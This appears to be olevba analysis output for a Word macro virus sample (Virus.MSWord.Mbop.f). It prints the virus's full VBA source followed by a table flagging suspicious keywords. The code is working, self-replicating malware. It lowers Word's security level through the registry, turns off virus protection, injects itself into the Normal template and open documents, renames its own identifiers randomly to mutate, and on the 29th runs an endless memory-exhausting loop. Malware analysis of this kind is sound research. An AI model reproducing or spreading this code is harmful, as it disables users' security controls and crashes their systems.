olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop.f-e4d379e5dac973261e69f3442b4a92e7c4544c7b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop.f-e4d379e5dac973261e69f3442b4a92e7c4544c7b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Docuauent_Open()
On Error Resuaue Next
auhhau = 1
aul1au = "M"
Systeau.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1&"
Options.VirusProtection = False
Options.SaveNoraualProaupt = False
aufiau = 1
Options.ConfirauConversions = False
Set auNtau = NoraualTeauplate.VBProject.VBCoauponents.Iteau(1).CodeModule
au11au = 1
Set auAdau = ActiveDocuauent.VBProject.VBCoauponents.Iteau(1).CodeModule
auseau = 3
Set auTdau = ThisDocuauent.VBProject.VBCoauponents.Iteau(1).CodeModule
autrau = 3
aul2au = "b"
aufnau = aufiau & auseau & autrau
For auiiau = 1 To auTdau.countoflines
If InStr(auTdau.lines(auiiau, 1), "Private Sub Docuauent_Open()") <> 0 Then
auSlau = auiiau
Exit For
End If
Next
aul3au = "o"
auVcau = Triau(auTdau.lines(auSlau, auSlau + aufnau))
aulvau = 97
au15au = 15
If auNtau.countoflines > 0 Then
auNlau = auNtau.lines(1, auNtau.countoflines)
If InStr(auNlau, "Nt") = 0 And InStr(auNlau, "Sl") = 0 And InStr(auNlau, "Nl") = 0 And InStr(auNlau, "Ad") = 0 And InStr(auNlau, "Vc") = 0 And InStr(auNlau, "Td") = 0 Then
If InStr(LCase(auNlau), "private sub docuauent_open()") <> 0 Then
For auiau = 1 To auNtau.countoflines
If InStr(LCase(auNtau.lines(auiau, 1)), "private sub docuauent_open()") <> 0 Then
aunsau = auiau
Exit For
End If
Next
For auiau = aunsau To auNtau.countoflines
If InStr(LCase(auNtau.lines(auiau, 1)), "end sub") <> 0 Then
auneau = auiau
Exit For
End If
Next
auNtau.deletelines aunsau, auneau
End If
If InStr(LCase(auNlau), "option explicit") <> 0 Then
For auiau = 1 To auNtau.countoflines
If InStr(LCase(auNtau.lines(auiau, 1)), "option explicit") <> 0 Then
aunsau = auiau
Exit For
End If
Next
auNtau.deletelines aunsau, 1
End If
auNtau.addfroaustring auVcau
auNtau.Save
auinau = auhhau
End If
Else
auNtau.addfroaustring auVcau
auNtau.Save
auinau = auhhau
End If
auhvau = 122
auiau = 1
audqau = Docuauents.Count
If auAdau.countoflines > 0 Then
auAlau = auAdau.lines(1, auAdau.countoflines)
If InStr(auAlau, "Nt") = 0 And InStr(auAlau, "Sl") = 0 And InStr(auAlau, "Nl") = 0 And InStr(auAlau, "Ad") = 0 And InStr(auAlau, "Vc") = 0 And InStr(auAlau, "Td") = 0 Then
If InStr(LCase(auAlau), "private sub docuauent_open()") <> 0 Then
For auiau = 1 To auAdau.countoflines
If InStr(LCase(auAdau.lines(auiau, 1)), "private sub docuauent_open()") <> 0 Then
aunsau = auiau
Exit For
End If
Next
For auiau = aunsau To auAdau.countoflines
If InStr(LCase(auAdau.lines(auiau, 1)), "end sub") <> 0 Then
auneau = auiau
Exit For
End If
Next
auAdau.deletelines aunsau, auneau
End If
If InStr(LCase(auAlau), "option explicit") <> 0 Then
For auiau = 1 To auAdau.countoflines
If InStr(LCase(auAdau.lines(auiau, 1)), "option explicit") <> 0 Then
aunsau = auiau
Exit For
End If
Next
auAdau.deletelines aunsau, 1
End If
auAdau.addfroaustring auVcau
auiaau = auhhau
End If
Else
auAdau.addfroaustring auVcau
auiaau = auhhau
End If
aul4au = "p"
Randoauize
au15au = Int((au15au - au11au + au11au) * Rnd + au11au)
For auiiau = 1 To au15au
Randoauize
auTnau = auTnau & Chr(Int((auhvau - aulvau + 1) * Rnd + aulvau))
Next
aud2au = 9
auVcau = auTdau.lines(1, auTdau.countoflines)
auTdau.deletelines 1, auTdau.countoflines
Do While InStr(auVcau, "au") <> 0
auVcau = Mid(auVcau, 1, InStr(auVcau, "au") - 1) & auTnau & Mid(auVcau, InStr(auVcau, "au") + Len("au"))
Loop
auTdau.addfroaustring auVcau
audyau = Day(Now)
aud1au = 2
aul5au = "!"
If audyau = aud1au & aud2au Then
Diau austau()
aucaau = 0
Do
ReDiau Preserve austau(aucaau)
auqwau = CLng(1024)
auqaau = auqwau
auqzau = auqwau * auqaau
austau(aucaau) = String(auqzau, Right(auTnau, 1))
DoEvents
aucaau = aucaau + 1
Loop
End If
If auiaau = auhhau Or auinau = auhhau Then
MsgBox aul1au & aul2au & aul3au & aul4au & aul5au, vbCritical
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
